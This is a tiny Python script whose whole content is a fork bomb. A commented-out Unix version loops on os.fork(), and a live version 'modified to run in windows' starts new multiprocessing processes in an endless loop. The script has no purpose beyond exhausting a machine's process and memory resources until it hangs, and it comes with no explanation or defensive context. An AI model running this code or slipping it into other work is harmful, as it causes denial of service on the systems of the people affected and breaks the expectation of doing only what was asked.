# import os
# while 1:
# 	os.fork()

# modified to run in windows
import multiprocessing

while True:
    p = multiprocessing.Process()
    p.start()
